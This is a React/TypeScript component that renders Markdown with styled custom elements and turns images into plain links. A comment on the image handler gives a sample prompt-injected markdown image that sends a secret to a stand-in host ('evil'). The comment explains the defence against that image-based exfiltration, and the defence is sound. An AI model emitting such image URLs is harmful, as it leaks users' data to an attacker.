import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'

const components: Components = {
  p: ({ children }) => <p className="leading-relaxed [&:not(:first-child)]:mt-3">{children}</p>,
  a: ({ children, href }) => (
    <a href={href} target="_blank" rel="noreferrer" className="text-brand underline underline-offset-2">
      {children}
    </a>
  ),
  ul: ({ children }) => <ul className="mt-2 list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="mt-2 list-decimal space-y-1 pl-5">{children}</ol>,
  h1: ({ children }) => <h3 className="mt-4 text-base font-semibold">{children}</h3>,
  h2: ({ children }) => <h3 className="mt-4 text-base font-semibold">{children}</h3>,
  h3: ({ children }) => <h4 className="mt-3 font-semibold">{children}</h4>,
  code: ({ children, className }) =>
    className ? <code className={`${className} font-mono text-xs`}>{children}</code> : <code className="rounded bg-surface-2 px-1 py-0.5 font-mono text-[0.85em]">{children}</code>,
  pre: ({ children }) => <pre className="mt-3 overflow-x-auto rounded-lg border bg-surface-2 p-3 font-mono text-xs leading-relaxed">{children}</pre>,
  table: ({ children }) => <table className="mt-3 w-full border-collapse text-sm [&_td]:border [&_td]:px-2 [&_td]:py-1 [&_th]:border [&_th]:px-2 [&_th]:py-1 [&_th]:text-left">{children}</table>,
  // Never auto-load remote images: a prompt-injected ![](https://evil/?d=secret) would leak data.
  img: ({ src, alt }) => (
    <a href={typeof src === 'string' ? src : undefined} target="_blank" rel="noreferrer" className="text-brand underline underline-offset-2">
      [image: {alt || 'link'}]
    </a>
  ),
  blockquote: ({ children }) => <blockquote className="mt-3 border-l-2 pl-3 text-muted-foreground">{children}</blockquote>,
}

export function Markdown({ text }: { text: string }) {
  return (
    <div className="text-sm">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {text}
      </ReactMarkdown>
    </div>
  )
}
